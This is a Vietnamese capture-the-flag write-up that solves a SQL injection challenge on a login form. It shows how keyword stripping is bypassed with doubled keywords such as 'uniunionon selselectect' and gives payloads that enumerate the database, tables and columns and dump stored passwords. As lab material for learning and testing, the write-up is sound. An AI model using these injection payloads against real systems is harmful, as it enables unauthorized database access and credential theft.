[image](https://github.com/Llam-a/BUUCTF/assets/115911041/7374a48a-8fb4-4505-82ac-ef5473117bf1)

Ta có form challenge. Mình sẽ thử inject cơ bản 

`user: 1' or 1=1-- -

pass: 1' or 1=1-- -`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/a1fdb887-10a1-48d8-bb17-ca4c3d2b11df)

Nếu các bạn thấy output chỗ pass đã đổi `or` thành null là do hàm `preg_repalce()` hoặc hàm tương tự. Sau đó mình có test với `union,where và select` đều bị thay thế. Nên ta sẽ làm cho sau khi xóa chữ or thì nó sẽ trở thành or, tương tự như select, where và union.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/15017af1-56d2-4dad-b4cd-e3e0b009bf60)

Ta có kết quả

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/07fd59ab-b30e-46f3-9398-437fdacaca14)

Và giờ ta sẽ check cột `admin' anandd 1=2 uniunionon selselectect 1,2,3-- -`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/799672a3-552a-4dda-a180-6315eebe097a)

Vậy là có lỗi ở cột 2 và 3. Tiếp tục khac thác database, table, column, data.

`admin' anandd 1=2 uniunionon selselectect 1,2,database()-- -`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f5f1fc0c-200f-4419-99c9-ca9834afe11c)

`admin' uunionnion sselectelect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()-- -`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/60af18c6-3c6c-4b63-a33f-374a275205b6)

Ta có 2 table. Mình sẽ xem table của `b4bsql`

`admin' uunionnion sselectelect 1,2,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name='b4bsql'-- -`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/ed6fb617-f2f0-425a-94e3-abdac6b5392b)

Kết quả cho ra 3 cột. Ta xem data trong password

`admin' uunionnion sselectelecte 1,2,group_concat(passwoorrd) ffromrom b4bsql-- -`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4153ea2d-8753-4ec6-8287-0e74dcfafd90)

